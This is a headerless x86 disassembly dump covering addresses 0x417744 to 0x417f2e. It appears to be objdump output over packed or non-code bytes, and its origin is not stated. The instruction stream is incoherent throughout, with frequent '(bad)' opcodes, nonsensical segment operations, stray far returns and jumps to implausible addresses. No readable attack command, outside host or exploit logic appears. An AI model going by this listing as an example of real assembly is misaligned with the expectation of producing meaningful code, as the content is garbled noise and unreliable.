  417744:	aad    0x27
  417746:	cmp    esi,ebx
  417748:	ja     0x4177b7
  41774a:	fild   QWORD PTR [eax-0x71711ef3]
  417750:	shl    BYTE PTR [eax],cl
  417752:	gs jns 0x4177d4
  417755:	aam    0x32
  417757:	inc    edi
  417758:	mov    ah,0x7
  41775a:	xchg   eax,ebp
  41775c:	pop    ds
  41775d:	xlat   BYTE PTR ds:[ebx]
  41775e:	shl    ebp,1
  417760:	fsubr  DWORD PTR [esi]
  417762:	xlat   BYTE PTR ds:[ebx]
  417763:	fiadd  WORD PTR [edi+0x14]
  417766:	and    DWORD PTR [eax+0x697c0424],ebx
  41776c:	and    eax,DWORD PTR [edx]
  41776e:	and    esp,esp
  417770:	pop    esp
  417771:	mov    al,0xda
  417773:	xchg   ebx,eax
  417774:	test   edi,0xd152e4ba
  41777a:	pop    edx
  41777b:	mov    dh,0xed
  41777d:	fnstcw WORD PTR [eax]
  41777f:	xor    bl,BYTE PTR gs:[esi]
  417782:	dec    esp
  417783:	cdq    
  417784:	fcom   DWORD PTR [eax-0x589db587]
  41778a:	int3   
  41778b:	push   esp
  41778c:	mov    ah,0x36
  41778e:	int3   
  41778f:	cmp    al,0x39
  417791:	dec    eax
  417792:	mov    WORD PTR [ebx],ss
  417794:	adc    eax,0x8386d587
  417799:	xchg   ebx,eax
  41779a:	sbb    ch,BYTE PTR [ecx+0x695bda38]
  4177a0:	iret   
  4177a1:	pop    ds
  4177a2:	stos   DWORD PTR es:[edi],eax
  4177a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177a4:	mov    ecx,DWORD PTR [ebp-0x51]
  4177a7:	mov    ebp,0x649ed640
  4177ac:	sbb    DWORD PTR [eax],0xffffffc3
  4177af:	jno    0x4177ee
  4177b1:	fcom   DWORD PTR [ebx-0x7f48fbc9]
  4177b7:	addr16 aad 0x54
  4177ba:	sahf   
  4177bb:	aam    0xa7
  4177bd:	mov    esi,0xc45b6297
  4177c2:	test   ebx,ebp
  4177c4:	stos   BYTE PTR es:[edi],al
  4177c5:	mov    ch,0x49
  4177c7:	aaa    
  4177c8:	mov    bl,0x2a
  4177ca:	js     0x41774f
  4177cc:	cs loopne 0x41781d
  4177cf:	mov    bl,ah
  4177d1:	lds    ebp,FWORD PTR [esi+0x2d]
  4177d4:	add    esp,ecx
  4177d6:	call   0xeca7ccb8
  4177db:	stc    
  4177dc:	out    dx,al
  4177dd:	sub    DWORD PTR [bp+si+0x6fae],ecx
  4177e2:	xor    ebp,eax
  4177e4:	(bad)  [ebp-0x46]
  4177e7:	popa   
  4177e8:	popf   
  4177e9:	dec    esp
  4177ea:	jne    0x4177cd
  4177ec:	dec    ebp
  4177ed:	lods   eax,DWORD PTR ds:[esi]
  4177ee:	scas   eax,DWORD PTR es:[edi]
  4177ef:	pop    es
  4177f0:	mov    ebp,0xfe913997
  4177f5:	mov    bh,0x61
  4177f7:	lea    edx,[ebp-0x4535ac3]
  4177fd:	cli    
  4177fe:	add    DWORD PTR [eax+0xb],ecx
  417801:	out    0x46,eax
  417803:	fiadd  DWORD PTR [edi]
  417805:	call   0x9f34f7c
  41780a:	pop    ds
  41780b:	mov    BYTE PTR [eax+0x6079fbd5],dl
  417811:	jle    0x417796
  417813:	add    ah,BYTE PTR [esi+ebx*2+0x10c2c95b]
  41781a:	add    BYTE PTR [ebp+0x55],cl
  41781d:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  417823:	mov    esp,ebp
  417825:	or     ah,dh
  417827:	dec    ebp
  417828:	add    bh,al
  41782a:	add    BYTE PTR [eax],cl
  41782c:	add    BYTE PTR [eax],al
  41782e:	mov    DWORD PTR [eax],0x40f44545
  417834:	xor    DWORD PTR [eax],eax
  417836:	test   DWORD PTR [ebx-0x34070b64],ecx
  41783c:	(bad)  
  41783d:	enter  0x4d45,0xbc
  417841:	mov    esi,DWORD PTR [eax]
  417843:	hlt    
  417844:	test   ebx,ecx
  417846:	pushf  
  417847:	enter  0x4df8,0x8b
  41784b:	mov    DWORD PTR [ebp-0x20],0x890208
  417852:	inc    ebp
  417853:	inc    ebp
  417854:	cld    
  417855:	xor    cl,BYTE PTR [ebx-0xb38b300]
  41785b:	or     BYTE PTR [ebx+0x0],dl
  41785e:	mov    ebx,0x8bd5500
  417863:	call   DWORD PTR [ecx-0x1]
  417866:	pop    es
  417867:	mov    ch,0x33
  417869:	dec    ebx
  41786b:	(bad)  
  41786c:	mov    eax,0x72009ca4
  417871:	push   DWORD PTR [edx]
  417873:	or     BYTE PTR [eax],al
  417875:	jmp    0xff89:0x75c84d03
  41787c:	dec    ebp
  41787d:	loopne 0x41784f
  41787f:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  417885:	add    BYTE PTR [ebx],dh
  417887:	mov    ecx,ebx
  417889:	hlt    
  41788a:	add    ecx,ebx
  41788c:	enter  0x899c,0x32
  417890:	dec    ebp
  417891:	add    ecx,eax
  417893:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  417899:	or     DWORD PTR [ebx-0xb00b29c],0x0
  4178a0:	xor    ecx,ebx
  4178a2:	retf   
  4178a3:	enter  0x4d03,0xc8
  4178a7:	mov    DWORD PTR fs:[eax],ebx
  4178aa:	lea    eax,[eax]
  4178ac:	push   esp
  4178ad:	mov    edi,edi
  4178af:	fs (bad) 
  4178b1:	(bad)  
  4178b2:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  4178b8:	push   0xffffffff
  4178ba:	and    bh,bh
  4178bc:	pop    ecx
  4178bd:	inc    eax
  4178be:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4178c4:	push   0xffffff8b
  4178c6:	pop    ecx
  4178c7:	cld    
  4178c8:	dec    ebp
  4178c9:	lea    ecx,[ecx+0x45ff08ff]
  4178cf:	mov    BYTE PTR [edx+0x1],cl
  4178d2:	add    BYTE PTR [eax],al
  4178d4:	mov    DWORD PTR [ebp+0x8],0x58008d
  4178db:	dec    DWORD PTR [ebp-0x77]
  4178de:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  4178e5:	cld    
  4178e6:	dec    ebp
  4178e7:	jne    0x41791c
  4178e9:	lea    eax,[ebx]
  4178eb:	push   eax
  4178ec:	mov    edi,edi
  4178ee:	or     BYTE PTR [ecx+0x54a845],cl
  4178f4:	add    al,ch
  4178f6:	(bad)  
  4178f7:	sub    esp,ebp
  4178f9:	add    BYTE PTR [eax],al
  4178fb:	rol    BYTE PTR [eax],0x84
  4178fe:	inc    ebp
  4178ff:	add    dh,BYTE PTR [esi+0x0]
  417902:	add    BYTE PTR [ebp-0x73],al
  417905:	mov    ebp,DWORD PTR [esp+edx*4]
  417908:	inc    DWORD PTR [eax]
  41790a:	lea    ecx,[ebx-0x30074f4]
  417910:	call   0x428495
  417915:	add    BYTE PTR [ebp+0x0],cl
  417918:	jne    0x41795b
  41791a:	dec    DWORD PTR [ebx-0x76210314]
  417920:	dec    ebp
  417921:	add    DWORD PTR [ebp+0x0],esi
  417924:	(bad)  
  417925:	xchg   ebp,eax
  417926:	loopne 0x417927
  417928:	inc    eax
  417929:	inc    DWORD PTR [eax]
  41792b:	mov    ecx,DWORD PTR [ebp-0x4]
  41792e:	xor    edx,DWORD PTR [edx+0x7201b8]
  417934:	add    BYTE PTR [edx],dl
  417936:	enter  0x4d90,0x0
  41793a:	mov    eax,DWORD PTR [eax]
  41793c:	hlt    
  41793d:	add    al,0xa5
  41793f:	mov    al,0xff
  417941:	add    bh,bh
  417943:	add    BYTE PTR [ebx],dh
  417945:	inc    DWORD PTR [ebx]
  417947:	sbb    al,0x89
  417949:	jne    0x417923
  41794b:	mov    esp,DWORD PTR [ecx+0x4500fc]
  417951:	mov    eax,DWORD PTR [ebp-0xff0048]
  417957:	mov    DWORD PTR [eax-0x70],0xee58ed89
  41795e:	inc    DWORD PTR [ebp-0x75]
  417961:	fisttp QWORD PTR [eax+eiz*8]
  417964:	test   DWORD PTR [esi-0x1],esp
  417967:	inc    ebp
  417968:	(bad)  
  417969:	aas    
  41796a:	inc    ebp
  41796b:	(bad)  
  41796c:	lea    edi,[esp+eiz*2-0x1]
  417970:	inc    edi
  417972:	mov    DWORD PTR ds:0x8000c7a0,edi
  417978:	mov    ebp,esi
  41797a:	cld    
  41797b:	in     al,0x8d
  41797d:	inc    ebp
  41797e:	jmp    eax
  417980:	(bad)  
  417981:	fisttp WORD PTR [eax+0x8801c7]
  417987:	jecxz  0x4179ce
  417989:	out    dx,al
  41798a:	inc    DWORD PTR [ebp-0x4]
  41798d:	out    0x8d,eax
  41798f:	aas    
  417990:	inc    edi
  417992:	jmp    FWORD PTR [eax-0x78]
  417995:	inc    DWORD PTR [ecx]
  417997:	mov    DWORD PTR [eax],0xc7a83d
  41799d:	ins    BYTE PTR es:[edi],dx
  41799e:	test   edi,edi
  4179a0:	pandn  mm0,mm5
  4179a3:	aas    
  4179a4:	add    bh,al
  4179a6:	mov    esi,DWORD PTR [eax-0x4]
  4179a9:	inc    DWORD PTR [eax+0xdf01e0]
  4179af:	(bad)  
  4179b0:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4179b4:	mov    ebp,ebx
  4179b6:	xchg   esp,eax
  4179b7:	fild   DWORD PTR [eax]
  4179b9:	(bad)  
  4179ba:	mov    edi,DWORD PTR [eax+0x3]
  4179bd:	(bad)  
  4179be:	cmp    al,0xe7
  4179c0:	dec    ebp
  4179c1:	leave  
  4179c2:	mov    ebp,eax
  4179c4:	fsubr  DWORD PTR [ecx]
  4179c6:	add    BYTE PTR [eax],al
  4179c8:	lea    ecx,[ebx-0x7f0003b4]
  4179ce:	push   edx
  4179cf:	add    DWORD PTR [ebp+0x0],edx
  4179d2:	mov    esi,DWORD PTR [eax]
  4179d4:	mov    WORD PTR [ebx-0x7a750000],?
  4179da:	add    esi,DWORD PTR [ebp-0x78]
  4179dd:	mov    eax,DWORD PTR [eax]
  4179df:	cld    
  4179e0:	push   0x7d
  4179e2:	dec    DWORD PTR [ebx+0xd88c]
  4179e8:	push   edx
  4179e9:	mov    edx,DWORD PTR [ecx-0x4]
  4179ec:	call   DWORD PTR [eax+0x7d01fc]
  4179f2:	mov    ebx,edx
  4179f4:	cld    
  4179f5:	add    BYTE PTR [eax+0x560150],dl
  4179fb:	test   DWORD PTR [ebp+0x75],eax
  4179fe:	in     al,0x8b
  417a00:	in     al,dx
  417a01:	cld    
  417a02:	(bad)  
  417a03:	jge    0x417999
  417a05:	mov    esp,ebx
  417a07:	fsub   st,st(7)
  417a09:	add    bh,al
  417a0b:	mov    ebx,DWORD PTR [eax-0x7a6f8f04]
  417a11:	add    edi,edi
  417a13:	add    bh,bh
  417a15:	mov    eax,0x50d800ed
  417a1a:	inc    ebp
  417a1b:	push   esi
  417a1c:	fisttp WORD PTR [ebx+0x4dc7f43f]
  417a22:	test   BYTE PTR [ebx],dh
  417a24:	fadd   DWORD PTR ds:0x4572c2
  417a2a:	jmp    0x4179ed
  417a2c:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  417a33:	inc    esi
  417a34:	jo     0x417a36
  417a36:	test   edi,eax
  417a38:	jmp    esp
  417a3a:	inc    DWORD PTR [eax]
  417a3c:	in     eax,dx
  417a3d:	add    al,bl
  417a3f:	jne    0x4179c6
  417a41:	mov    edi,edi
  417a43:	cld    
  417a44:	inc    DWORD PTR [ebp-0x12]
  417a47:	mov    esp,esp
  417a49:	mov    ah,0x85
  417a4b:	add    bh,bh
  417a4d:	call   0x119a351
  417a52:	ret    0x858b
  417a55:	cld    
  417a56:	inc    DWORD PTR [eax+0xe301ff]
  417a5c:	out    dx,al
  417a5d:	xor    BYTE PTR [ebp-0xff00cf],al
  417a63:	mov    ebx,ebp
  417a65:	cld    
  417a66:	jo     0x4179f1
  417a68:	or     DWORD PTR [ecx],eax
  417a6a:	add    BYTE PTR [eax],al
  417a6c:	push   eax
  417a6d:	add    DWORD PTR [ebp+0x45],eax
  417a70:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  417a76:	dec    DWORD PTR [ebx-0x3fda0318]
  417a7c:	add    BYTE PTR [ebp-0xbf0040],dl
  417a82:	inc    ebp
  417a83:	or     BYTE PTR [ebx-0x4faf0400],0x45
  417a8a:	add    DWORD PTR [ebx+0x459c00],ecx
  417a90:	mov    edi,edi
  417a92:	mov    eax,0xe80800ff
  417a97:	inc    ebp
  417a98:	sub    BYTE PTR [ebx-0x47000400],cl
  417a9e:	add    al,0x1
  417aa0:	rol    BYTE PTR [eax],0x1e
  417aa3:	jne    0x417aea
  417aa5:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  417aab:	inc    DWORD PTR [ecx]
  417aad:	call   0x86a2b2
  417ab2:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  417ab8:	call   0x41a2be
  417abd:	xor    bh,bh
  417abf:	push   edi
  417ac0:	adc    BYTE PTR [ebx-0x747423bb],al
  417ac6:	loopne 0x417aa4
  417ac8:	ret    
  417ac9:	loopne 0x417a67
  417acb:	xor    DWORD PTR [edx],0x31
  417ace:	cmp    edi,edi
  417ad0:	bswap  esp
  417ad2:	rol    BYTE PTR gs:[eax],0x5
  417ad6:	jmp    0x12c7c20
  417adb:	mov    eax,DWORD PTR [ebp-0x4]
  417ade:	add    BYTE PTR [eax+0xff0100],bh
  417ae4:	cld    
  417ae5:	jne    0x417b64
  417ae7:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  417aed:	push   ss
  417aee:	add    DWORD PTR [eax],eax
  417af0:	add    BYTE PTR [eax+0x7f],dl
  417af3:	inc    ebp
  417af4:	add    BYTE PTR [ebx+0x459850],cl
  417afa:	mov    edi,edi
  417afc:	test   al,0xff
  417afe:	add    BYTE PTR [eax],cl
  417b00:	inc    DWORD PTR [ebp-0x18]
  417b03:	jmp    DWORD PTR ds:0x4d7d00dc
  417b09:	adc    BYTE PTR [ebx+0x459cb9],cl
  417b0f:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  417b15:	pushf  
  417b16:	mov    eax,0x30132
  417b1b:	lea    esi,[ebp+0x2c]
  417b1e:	xor    edi,edi
  417b20:	(bad)  
  417b21:	call   0x140a28e
  417b26:	call   0x135a3b6
  417b2b:	jne    0x417ab8
  417b2d:	xor    edi,esp
  417b2f:	add    eax,DWORD PTR [eax+0xc018d]
  417b35:	push   DWORD PTR [eax]
  417b37:	call   0xcaa293
  417b3c:	int3   
  417b3d:	inc    DWORD PTR [ebp-0x14]
  417b40:	mov    ecx,DWORD PTR [ebp-0x28]
  417b43:	xor    eax,DWORD PTR [eax]
  417b45:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  417b4b:	(bad)  
  417b4c:	xchg   ebp,eax
  417b4d:	in     al,0xff
  417b4f:	add    bh,bh
  417b51:	add    BYTE PTR [ebp+0x45],dl
  417b54:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  417b5a:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff64]
  417b61:	mov    edi,edi
  417b63:	or     BYTE PTR [eax],cl
  417b65:	inc    ebp
  417b66:	test   DWORD PTR gs:[eax],eax
  417b69:	je     0x417bb0
  417b6b:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  417b71:	xor    edx,DWORD PTR [eax-0x73]
  417b74:	push   ebp
  417b75:	or     BYTE PTR [ebp+0x21007572],al
  417b7b:	inc    ebp
  417b7c:	in     al,dx
  417b7d:	mov    ebp,DWORD PTR [eax]
  417b7f:	mov    esp,0x648bc345
  417b84:	fmul   st,st(5)
  417b86:	add    BYTE PTR [ebx],ch
  417b88:	mov    eax,DWORD PTR [ebx]
  417b8a:	cld    
  417b8b:	loopne 0x417b4d
  417b8d:	inc    ebp
  417b8e:	push   ebp
  417b8f:	cmp    ebp,eax
  417b91:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  417b98:	cld    
  417b99:	fadd   DWORD PTR [eax+0x3b014d]
  417b9f:	jne    0x417bd1
  417ba1:	push   0xf8898557
  417ba6:	in     al,dx
  417ba7:	jne    0x417bee
  417ba9:	lea    eax,[ebx+0x72e8dcc8]
  417baf:	das    
  417bb0:	mov    eax,DWORD PTR [eax]
  417bb2:	mov    esp,0x33eb7545
  417bb7:	mov    edi,DWORD PTR [edi+0x4572bc]
  417bbd:	xor    eax,edi
  417bbf:	adc    DWORD PTR [ebp-0xcd0064],0x8be131
  417bc9:	rcl    BYTE PTR [eax-0x40],1
  417bcc:	inc    ebp
  417bcd:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  417bd5:	inc    ebp
  417bd6:	xchg   ebp,eax
  417bd7:	ud0    ebp,DWORD PTR [ebx]
  417bda:	inc    DWORD PTR [eax]
  417bdc:	retf   
  417bdd:	jbe    0x417bdf
  417bdf:	mov    dl,BYTE PTR [eax-0x80]
  417be2:	push   ebp
  417be3:	pop    ds
  417be4:	mov    ecx,DWORD PTR [esp+esi*8]
  417be7:	inc    eax
  417be8:	retf   
  417be9:	inc    ebp
  417bea:	iret   
  417beb:	jb     0x417bb5
  417bed:	mov    eax,DWORD PTR [edi]
  417bef:	enter  0x4545,0x1
  417bf3:	xor    DWORD PTR [eax],eax
  417bf5:	pushf  
  417bf6:	mov    ecx,DWORD PTR [ecx+0x304df0bc]
  417bfc:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  417c03:	dec    ebp
  417c04:	add    BYTE PTR [ebx],dh
  417c06:	inc    ebp
  417c07:	mov    DWORD PTR [ebx-0x3f631b4c],ecx
  417c0d:	xor    dl,BYTE PTR [edx]
  417c0f:	add    eax,DWORD PTR [ebp-0x77]
  417c12:	mov    eax,esp
  417c14:	fmul   DWORD PTR [ebp-0x3d]
  417c17:	xor    eax,DWORD PTR [ebx+eax*1+0x832899c]
  417c1e:	mov    DWORD PTR [ebp-0x28],eax
  417c21:	rol    DWORD PTR [ebp-0x64],1
  417c24:	xor    eax,edi
  417c26:	mov    ecx,0xff858db0
  417c2b:	clc    
  417c2c:	enter  0x4d45,0x32
  417c30:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  417c37:	test   esi,edi
  417c39:	clc    
  417c3a:	inc    DWORD PTR [ebp+0x45]
  417c3d:	cmp    al,0x8b
  417c3f:	pushf  
  417c40:	or     bh,al
  417c42:	enter  0x16a8,0x85
  417c46:	xor    eax,edi
  417c48:	pushf  
  417c49:	inc    ebp
  417c4a:	(bad)  
  417c4b:	ds cld 
  417c4d:	pushf  
  417c4e:	inc    ebp
  417c4f:	mov    edx,DWORD PTR [eax-0x28]
  417c52:	lock push ebp
  417c54:	add    BYTE PTR [ebx],dh
  417c56:	mov    DWORD PTR [ebx],eax
  417c58:	sar    BYTE PTR [ebx],1
  417c5a:	adc    BYTE PTR [edi],cl
  417c5c:	dec    ebp
  417c5d:	adc    al,0x8b
  417c5f:	add    al,dl
  417c61:	jmp    0x1027e31
  417c66:	jb     0x417cb5
  417c68:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  417c6e:	xor    ecx,DWORD PTR [ebp+0x3b]
  417c71:	xor    ecx,DWORD PTR [edi]
  417c73:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  417c77:	(bad)  
  417c79:	clc    
  417c7a:	enter  0x8400,0x8b
  417c7e:	pop    es
  417c7f:	mov    al,0x0
  417c81:	push   ebp
  417c82:	push   cs
  417c83:	xor    ecx,eax
  417c85:	xor    esp,ecx
  417c87:	add    ebp,DWORD PTR [eax]
  417c89:	add    esi,DWORD PTR [eax]
  417c8b:	(bad)  
  417c8d:	retf   0x55c8
  417c90:	repnz mov eax,DWORD PTR [ebp-0x10]
  417c94:	(bad)  
  417c95:	cli    
  417c96:	fdivr  st,st(1)
  417c98:	test   DWORD PTR [eax+edi*8],ecx
  417c9b:	dec    ebp
  417c9c:	inc    ebp
  417c9d:	xor    edi,DWORD PTR [eax-0x7167afd]
  417ca3:	add    BYTE PTR [ebp+0x0],al
  417ca6:	mov    ecx,DWORD PTR [ebp-0x28]
  417ca9:	mov    ecx,ebx
  417cab:	clc    
  417cac:	jne    0x417c79
  417cae:	mov    esi,0xd672d3
  417cb3:	into   
  417cb4:	into   
  417cb5:	scas   eax,DWORD PTR es:[edi]
  417cb6:	dec    ebp
  417cb7:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  417cbd:	sub    ecx,esi
  417cbf:	cmp    ecx,DWORD PTR [ebp+0x77]
  417cc2:	(bad)  
  417cc3:	mov    edi,eax
  417cc5:	mov    al,0x85
  417cc7:	mov    eax,edi
  417cc9:	add    BYTE PTR [ebp-0x75],al
  417ccc:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  417cd3:	xor    eax,DWORD PTR [ebp+0x4503f803]
  417cd9:	(bad)  
  417cdb:	retf   0x559c
  417cde:	(bad)  
  417cdf:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  417ce6:	inc    ebp
  417ce7:	add    eax,0xeb9c4d3f
  417cec:	(bad)  
  417ced:	mov    ecx,esp
  417cef:	lods   al,BYTE PTR ds:[esi]
  417cf0:	test   DWORD PTR [ebp-0x8],edx
  417cf3:	xor    ecx,DWORD PTR [ebp+0x33]
  417cf6:	mov    eax,DWORD PTR [ebx]
  417cf8:	lock add ecx,ebx
  417cfb:	bswap  esi
  417cfd:	retf   0x55d1
  417d00:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  417d06:	jmp    0x417d01
  417d08:	add    BYTE PTR ds:0xebc44d8b,al
  417d0e:	push   ebp
  417d0f:	mov    ebp,DWORD PTR [ebx]
  417d11:	test   al,0x8b
  417d13:	push   ebp
  417d14:	clc    
  417d15:	xor    ecx,ebx
  417d17:	xor    ecx,esi
  417d19:	add    edx,ecx
  417d1b:	add    eax,DWORD PTR [edx+0xca010f]
  417d21:	push   ebp
  417d22:	dec    ebp
  417d23:	mov    ecx,DWORD PTR [ebx-0x34050710]
  417d29:	stc    
  417d2a:	rol    DWORD PTR ds:0xebce4dd6,cl
  417d30:	scas   eax,DWORD PTR es:[edi]
  417d31:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  417d37:	xor    ebp,DWORD PTR [ebx]
  417d39:	xor    edi,DWORD PTR [ebx]
  417d3b:	add    esi,DWORD PTR [edi+0x3]
  417d3e:	mov    ecx,DWORD PTR [edi]
  417d40:	clc    
  417d41:	retf   0x55cb
  417d44:	into   
  417d45:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  417d4c:	mov    eax,0x3376554d
  417d51:	mov    esi,DWORD PTR [ebx]
  417d53:	int3   
  417d54:	add    edx,DWORD PTR [ebp+0x3]
  417d57:	xor    ecx,DWORD PTR [edi]
  417d59:	xor    ecx,edx
  417d5b:	add    edx,DWORD PTR [ebp+0x3]
  417d5e:	mov    ecx,DWORD PTR [edi]
  417d60:	lock retf 0x4dfa
  417d64:	stc    
  417d65:	mov    ecx,DWORD PTR [eax]
  417d67:	or     BYTE PTR [ebp+0x4d],cl
  417d6a:	jmp    0x1057dfa
  417d6f:	dec    ebp
  417d70:	dec    ebp
  417d71:	(bad)  
  417d72:	mov    ebx,esp
  417d74:	clc    
  417d75:	test   ebx,ecx
  417d77:	clc    
  417d78:	ror    DWORD PTR [ebp-0x2a],cl
  417d7b:	mov    esi,ecx
  417d7d:	call   0x33ccc331
  417d82:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  417d89:	retf   
  417d8a:	ja     0x417d5a
  417d8c:	mov    ebp,DWORD PTR [eax-0x48]
  417d8f:	dec    ebp
  417d90:	xor    ecx,DWORD PTR [di+0x3]
  417d94:	mov    esp,esp
  417d96:	clc    
  417d97:	push   ebp
  417d98:	retf   
  417d99:	mov    dl,bl
  417d9b:	adc    esi,edx
  417d9d:	jb     0x417d6d
  417d9f:	add    BYTE PTR [edi-0x3b7474b3],ch
  417da5:	call   0x4d6d4927
  417daa:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  417db0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417db1:	pushf  
  417db2:	inc    ebp
  417db3:	xor    cl,BYTE PTR [ebp-0x78]
  417db6:	mov    edx,edi
  417db8:	clc    
  417db9:	dec    ebp
  417dba:	retf   
  417dbb:	mov    edx,ebx
  417dbd:	call   0x56105198
  417dc2:	scas   eax,DWORD PTR es:[edi]
  417dc3:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  417dc9:	pushf  
  417dca:	sub    esi,DWORD PTR [edx]
  417dcc:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  417dd2:	lods   al,BYTE PTR ds:[esi]
  417dd3:	xor    esp,DWORD PTR [ebx]
  417dd5:	add    ecx,DWORD PTR [ebp-0x1c]
  417dd8:	mov    edi,DWORD PTR [ebp-0x8]
  417ddb:	mov    bl,cl
  417ddd:	cmp    dl,bl
  417ddf:	jb     0x417daf
  417de1:	add    dh,dl
  417de3:	dec    ebp
  417de4:	scas   eax,DWORD PTR es:[edi]
  417de5:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  417deb:	shr    DWORD PTR [ebx],cl
  417ded:	into   
  417dee:	cmp    edx,esi
  417df0:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  417df6:	dec    ebp
  417df7:	dec    ebp
  417df8:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  417dfe:	retf   
  417dff:	xor    edx,esi
  417e01:	add    ecx,esi
  417e03:	imul   ecx,edx
  417e06:	mov    DWORD PTR [ebp+0x8],edx
  417e09:	xor    ecx,DWORD PTR [ebp+0x2b]
  417e0c:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  417e12:	add    esi,DWORD PTR [ebx]
  417e14:	mov    ah,0x3
  417e16:	inc    ebp
  417e17:	rdtsc  
  417e19:	xlat   BYTE PTR ds:[ebx]
  417e1a:	pushf  
  417e1b:	jge    0x417da6
  417e1d:	xor    ebx,eax
  417e1f:	sub    eax,DWORD PTR [ebp-0x73]
  417e22:	(bad)  
  417e23:	cmp    al,al
  417e25:	jb     0x417dac
  417e27:	add    al,bh
  417e29:	ror    DWORD PTR [ebp-0x7a],1
  417e2c:	xor    edi,edi
  417e2e:	add    edi,edi
  417e30:	jmp    0x417e7f
  417e32:	mov    ecx,DWORD PTR [ebx-0x34341324]
  417e38:	dec    ebp
  417e39:	into   
  417e3a:	mov    ebp,DWORD PTR [edi-0x23737428]
  417e40:	pushf  
  417e41:	shl    DWORD PTR [edx],cl
  417e43:	retf   0x5588
  417e46:	or     ecx,DWORD PTR [ebp+0x7233114d]
  417e4c:	add    eax,DWORD PTR [eax]
  417e4e:	in     al,0x4d
  417e50:	push   ebp
  417e51:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  417e57:	fs add ch,cl
  417e5a:	dec    ebp
  417e5b:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  417e61:	dec    ebp
  417e62:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  417e68:	jge    0x417e38
  417e6a:	mov    BYTE PTR [edi+0xf723b3a],ch
  417e70:	add    cl,dh
  417e72:	dec    ebp
  417e73:	dec    DWORD PTR [ebx-0x2c032375]
  417e79:	adc    BYTE PTR [ebp+0x1],0x8b
  417e7d:	add    al,bl
  417e7f:	jge    0x417e0d
  417e81:	push   0xffffff9c
  417e83:	push   0x8b3032
  417e88:	shl    BYTE PTR [ebp+0x55],0x6a
  417e8c:	xor    edi,edi
  417e8e:	xor    edx,DWORD PTR [ebx+eax*1]
  417e91:	inc    ebp
  417e92:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  417e98:	dec    ebp
  417e99:	or     BYTE PTR [ecx+0x4dc8e483],cl
  417e9f:	jbe    0x417e2c
  417ea1:	mov    ebp,esp
  417ea3:	ror    bl,1
  417ea5:	enter  0x14ce,0xaf
  417ea9:	dec    DWORD PTR [ebx-0x2cef17f8]
  417eaf:	push   ebp
  417eb0:	retf   0x5540
  417eb3:	push   ebp
  417eb4:	mov    esi,DWORD PTR [edx-0x1c]
  417eb7:	mov    edx,ebx
  417eb9:	cld    
  417eba:	(bad)  
  417ebb:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  417ec2:	sti    
  417ec3:	add    dh,cl
  417ec5:	push   0xffffff94
  417ec7:	call   FWORD PTR [eax+edx*8-0x74c4afce]
  417ece:	bswap  esp
  417ed0:	pop    esi
  417ed1:	inc    ebp
  417ed2:	dec    DWORD PTR [ecx+0x45e8c88b]
  417ed8:	push   ebp
  417ed9:	xor    esi,DWORD PTR [ebx]
  417edb:	mov    DWORD PTR [ebx],0xcac00f9c
  417ee1:	aas    
  417ee2:	push   ebp
  417ee3:	inc    ebp
  417ee4:	xor    ecx,eax
  417ee6:	add    ecx,eax
  417ee8:	mov    eax,DWORD PTR [ebx]
  417eea:	(bad)  
  417eeb:	jmp    0x417e79
  417eed:	mov    bl,BYTE PTR [ebp+eax*1-0x2f7674ce]
  417ef4:	les    edi,FWORD PTR [esi-0xeccefb3]
  417efa:	mov    edx,0xff378d80
  417eff:	mov    dh,0xd1
  417f01:	cmp    edx,DWORD PTR [ebp+0xf]
  417f04:	mov    eax,DWORD PTR [edx-0x20]
  417f07:	add    BYTE PTR [ebp-0x75],bh
  417f0a:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  417f11:	pushf  
  417f12:	retf   0x8632
  417f15:	cmp    ebp,0x8
  417f18:	call   ebx
  417f1a:	inc    ebp
  417f1b:	inc    ebp
  417f1c:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  417f22:	mov    esi,DWORD PTR [ecx]
  417f24:	enter  0x49c,0xc7
  417f28:	add    al,al
  417f2a:	add    bl,al
  417f2c:	(bad)  
  417f2d:	clc    
  417f2e:	enter  0x45,0x31
